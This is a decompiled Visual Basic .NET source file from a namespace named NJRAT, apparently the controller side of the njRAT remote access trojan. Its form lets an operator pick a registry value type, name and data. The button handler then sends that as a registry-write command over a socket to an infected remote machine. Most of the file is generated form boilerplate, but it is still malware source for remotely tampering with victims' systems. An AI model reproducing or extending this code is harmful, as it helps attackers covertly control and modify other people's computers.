Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Namespace NJRAT
	' Token: 0x0200001D RID: 29
	<DesignerGenerated()>
	Public Partial Class RGv
		Inherits Form

		' Token: 0x060004AB RID: 1195 RVA: 0x00002E33 File Offset: 0x00001033
		<DebuggerNonUserCode()>
		Public Sub New()
			RGv.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x060004AC RID: 1196 RVA: 0x0002AC38 File Offset: 0x00028E38
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = RGv.__ENCList
			SyncLock _ENCList
				If RGv.__ENCList.Count = RGv.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = RGv.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = RGv.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								RGv.__ENCList(num) = RGv.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					RGv.__ENCList.RemoveRange(num, RGv.__ENCList.Count - num)
					RGv.__ENCList.Capacity = RGv.__ENCList.Count
				End If
				RGv.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001B1 RID: 433
		' (get) Token: 0x060004AF RID: 1199 RVA: 0x0002B99C File Offset: 0x00029B9C
		' (set) Token: 0x060004B0 RID: 1200 RVA: 0x00002E47 File Offset: 0x00001047
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x170001B2 RID: 434
		' (get) Token: 0x060004B1 RID: 1201 RVA: 0x0002B9B4 File Offset: 0x00029BB4
		' (set) Token: 0x060004B2 RID: 1202 RVA: 0x00002E50 File Offset: 0x00001050
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x170001B3 RID: 435
		' (get) Token: 0x060004B3 RID: 1203 RVA: 0x0002B9CC File Offset: 0x00029BCC
		' (set) Token: 0x060004B4 RID: 1204 RVA: 0x0002B9E4 File Offset: 0x00029BE4
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click_1
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B4 RID: 436
		' (get) Token: 0x060004B5 RID: 1205 RVA: 0x0002BA3C File Offset: 0x00029C3C
		' (set) Token: 0x060004B6 RID: 1206 RVA: 0x00002E59 File Offset: 0x00001059
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x170001B5 RID: 437
		' (get) Token: 0x060004B7 RID: 1207 RVA: 0x0002BA54 File Offset: 0x00029C54
		' (set) Token: 0x060004B8 RID: 1208 RVA: 0x00002E62 File Offset: 0x00001062
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x170001B6 RID: 438
		' (get) Token: 0x060004B9 RID: 1209 RVA: 0x0002BA6C File Offset: 0x00029C6C
		' (set) Token: 0x060004BA RID: 1210 RVA: 0x00002E6B File Offset: 0x0000106B
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x170001B7 RID: 439
		' (get) Token: 0x060004BB RID: 1211 RVA: 0x0002BA84 File Offset: 0x00029C84
		' (set) Token: 0x060004BC RID: 1212 RVA: 0x00002E74 File Offset: 0x00001074
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x170001B8 RID: 440
		' (get) Token: 0x060004BD RID: 1213 RVA: 0x0002BA9C File Offset: 0x00029C9C
		' (set) Token: 0x060004BE RID: 1214 RVA: 0x00002E7D File Offset: 0x0000107D
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x170001B9 RID: 441
		' (get) Token: 0x060004BF RID: 1215 RVA: 0x0002BAB4 File Offset: 0x00029CB4
		' (set) Token: 0x060004C0 RID: 1216 RVA: 0x00002E86 File Offset: 0x00001086
		Friend Overridable Property FlatMini1 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini1 = value
			End Set
		End Property

		' Token: 0x170001BA RID: 442
		' (get) Token: 0x060004C1 RID: 1217 RVA: 0x0002BACC File Offset: 0x00029CCC
		' (set) Token: 0x060004C2 RID: 1218 RVA: 0x0002BAE4 File Offset: 0x00029CE4
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001BB RID: 443
		' (get) Token: 0x060004C3 RID: 1219 RVA: 0x0002BB3C File Offset: 0x00029D3C
		' (set) Token: 0x060004C4 RID: 1220 RVA: 0x00002E8F File Offset: 0x0000108F
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x170001BC RID: 444
		' (get) Token: 0x060004C5 RID: 1221 RVA: 0x0002BB54 File Offset: 0x00029D54
		' (set) Token: 0x060004C6 RID: 1222 RVA: 0x00002E98 File Offset: 0x00001098
		Friend Overridable Property FlatMini2 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini2 = value
			End Set
		End Property

		' Token: 0x060004C7 RID: 1223 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Button1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060004C8 RID: 1224 RVA: 0x0002BB6C File Offset: 0x00029D6C
		Public Function Typ(t As String) As Integer
			Dim left As String = t.ToLower()
			Dim result As Integer
			If Operators.CompareString(left, RegistryValueKind.Binary.ToString().ToLower(), False) = 0 Then
				result = 3
			ElseIf Operators.CompareString(left, RegistryValueKind.DWord.ToString().ToLower(), False) = 0 Then
				result = 4
			ElseIf Operators.CompareString(left, RegistryValueKind.ExpandString.ToString().ToLower(), False) = 0 Then
				result = 2
			ElseIf Operators.CompareString(left, RegistryValueKind.MultiString.ToString().ToLower(), False) = 0 Then
				result = 7
			ElseIf Operators.CompareString(left, RegistryValueKind.QWord.ToString().ToLower(), False) = 0 Then
				result = 11
			ElseIf Operators.CompareString(left, RegistryValueKind.[String].ToString().ToLower(), False) = 0 Then
				result = 1
			Else
				Dim num As Integer
				result = num
			End If
			Return result
		End Function

		' Token: 0x060004C9 RID: 1225 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x060004CA RID: 1226 RVA: 0x0002BC4C File Offset: 0x00029E4C
		Private Sub Button1_Click_1(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "!", Class7.string_1, Me.Path, Class7.string_1, Me.TextBox1.Text, Class7.string_1, Me.TextBox3.Text, Class7.string_1, Conversions.ToString(Me.Typ(Me.ComboBox1.Text)) }))
			Me.Close()
		End Sub

		' Token: 0x04000221 RID: 545
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000223 RID: 547
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x04000224 RID: 548
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000225 RID: 549
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000226 RID: 550
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x04000227 RID: 551
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000228 RID: 552
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000229 RID: 553
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x0400022A RID: 554
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x0400022B RID: 555
		<AccessedThroughProperty("FlatMini1")>
		Private _FlatMini1 As FlatMini

		' Token: 0x0400022C RID: 556
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x0400022D RID: 557
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x0400022E RID: 558
		<AccessedThroughProperty("FlatMini2")>
		Private _FlatMini2 As FlatMini

		' Token: 0x0400022F RID: 559
		Public Path As String

		' Token: 0x04000230 RID: 560
		Public sk As Client
	End Class
End Namespace
